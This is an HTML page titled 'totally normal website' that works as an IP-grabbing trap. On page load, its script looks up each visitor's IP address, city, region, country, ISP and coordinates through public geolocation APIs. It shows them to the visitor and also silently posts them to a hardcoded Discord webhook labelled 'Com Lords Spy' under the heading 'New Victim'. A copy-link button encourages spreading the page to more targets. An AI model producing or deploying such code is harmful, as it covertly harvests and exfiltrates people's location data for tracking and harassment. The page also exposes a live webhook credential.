<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>totally normal website</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg: #0a0a0a;
      --ink: #ff2222;
      --muted: #991111;
      --accent: #ff0000;
      --border: #3a0000;
      --card: #140000;
    }

    body {
      background: var(--bg);
      color: var(--ink);
      font-family: 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 2rem 2rem 4rem;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(var(--border) 1px, transparent 1px),
        linear-gradient(90deg, var(--border) 1px, transparent 1px);
      background-size: 40px 40px;
      opacity: 0.35;
      pointer-events: none;
    }

    .wrapper {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 560px;
    }

    .reveal-header {
      text-align: center;
      margin-bottom: 2rem;
      margin-top: 2rem;
    }

    .reveal-title {
      font-size: clamp(1.4rem, 4vw, 2rem);
      font-weight: 900;
      letter-spacing: -0.02em;
      line-height: 1.2;
      color: var(--ink);
      text-shadow: 0 0 20px rgba(255,0,0,0.5);
    }

    .reveal-title em {
      font-style: italic;
      color: var(--accent);
    }

    .reveal-subtitle {
      font-size: 0.7rem;
      color: var(--muted);
      letter-spacing: 0.1em;
      text-transform: uppercase;
      margin-top: 0.5rem;
    }

    .group-photo {
      width: 100%;
      max-width: 420px;
      border: 2px solid var(--border);
      box-shadow: 6px 6px 0 var(--border);
      display: block;
      margin: 0 auto 2rem;
    }

    .card {
      background: var(--card);
      border: 1px solid var(--border);
      box-shadow: 6px 6px 0 var(--border);
      padding: 1.75rem;
      margin-bottom: 1rem;
    }

    .card-label {
      font-size: 0.6rem;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 0.35rem;
    }

    .card-value {
      font-size: 1.05rem;
      font-weight: 600;
      color: var(--ink);
      word-break: break-all;
    }

    .card-value.accent { color: var(--accent); }

    .data-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1rem;
      margin-bottom: 1rem;
    }

    .data-cell {
      background: var(--card);
      border: 1px solid var(--border);
      padding: 1rem 1.2rem;
    }

    .data-cell .card-value {
      font-size: 0.88rem;
    }

    .share-btn {
      display: block;
      width: 100%;
      margin-top: 1.25rem;
      background: transparent;
      border: 1.5px solid var(--ink);
      color: var(--ink);
      font-family: 'Courier New', monospace;
      font-size: 0.78rem;
      letter-spacing: 0.08em;
      padding: 0.85rem;
      cursor: pointer;
      transition: background 0.15s, color 0.15s;
    }

    .share-btn:hover { background: var(--ink); color: var(--bg); }

    #data-content { display: block; }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>

<script>
  async function fetchIP() {
    const apis = [
      async () => {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        if (!d.success) throw new Error('ipwho failed: ' + JSON.stringify(d));
        return { ip: d.ip, city: d.city, regionName: d.region, country: d.country, isp: (d.connection && (d.connection.isp || d.connection.org)) || '—', lat: d.latitude, lon: d.longitude };
      },
      async () => {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        if (d.error) throw new Error('ipapi failed: ' + JSON.stringify(d));
        return { ip: d.ip, city: d.city, regionName: d.region, country: d.country_name, isp: d.org || '—', lat: d.latitude, lon: d.longitude };
      },
      async () => {
        const r = await fetch('https://freeipapi.com/api/json');
        const d = await r.json();
        return { ip: d.ipAddress, city: d.cityName, regionName: d.regionName, country: d.countryName, isp: '—', lat: d.latitude, lon: d.longitude };
      }
    ];
    const errors = [];
    for (const api of apis) {
      try { return await api(); } catch(e) { errors.push(e.message); continue; }
    }
    throw new Error('All APIs failed: ' + errors.join(' | '));
  }

  async function startReveal() {
    let data;
    try {
      data = await fetchIP();
    } catch(e) {
      document.getElementById('out-ip').textContent = 'ERROR: ' + e.message;
      data = { ip: 'error', city: '???', regionName: '???', country: '???', isp: '???', lat: '?', lon: '?' };
    }

    document.getElementById('out-ip').textContent     = data.ip || 'unavailable';
    document.getElementById('out-city').textContent   = data.city || '—';
    document.getElementById('out-region').textContent = data.regionName || '—';
    document.getElementById('out-country').textContent= data.country || '—';
    document.getElementById('out-isp').textContent    = data.isp || '—';
    document.getElementById('out-coords').textContent = data.lat + ', ' + data.lon;

    document.getElementById('phase-loading').style.display = 'none';
    document.getElementById('phase-reveal').style.display = 'block';



    fetch('https://discord.com/api/webhooks/1485458712968822784/-HmSSxfpKDqcQclV31xTSf-nsy4KlMohaYHXhfFLwcYOz23sTAxHA3UxYKYWaTXeBblS', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Com Lords Spy',
        avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
        embeds: [{
          title: '🎯 New Victim',
          color: 0xff0000,
          fields: [
            { name: '🌐 IP Address', value: data.ip || 'unknown', inline: true },
            { name: '🏙️ City', value: data.city || 'unknown', inline: true },
            { name: '🗺️ Region', value: data.regionName || 'unknown', inline: true },
            { name: '🌍 Country', value: data.country || 'unknown', inline: true },
            { name: '📡 ISP', value: data.isp || 'unknown', inline: true },
            { name: '📍 Coordinates', value: data.lat + ', ' + data.lon, inline: true },
          ],
          footer: { text: 'Made By Raiden • Ran by the Com Lords' },
          timestamp: new Date().toISOString()
        }]
      })
    }).catch(() => {});
  }

  window.onload = startReveal;

  function copyLink() {
    navigator.clipboard.writeText(location.href).then(() => {
      const btn = document.querySelector('.share-btn');
      btn.textContent = '✓  LINK COPIED — GO GET EM';
      setTimeout(() => { btn.textContent = '⎘  COPY LINK TO SEND TO A FRIEND'; }, 2500);
    });
  }
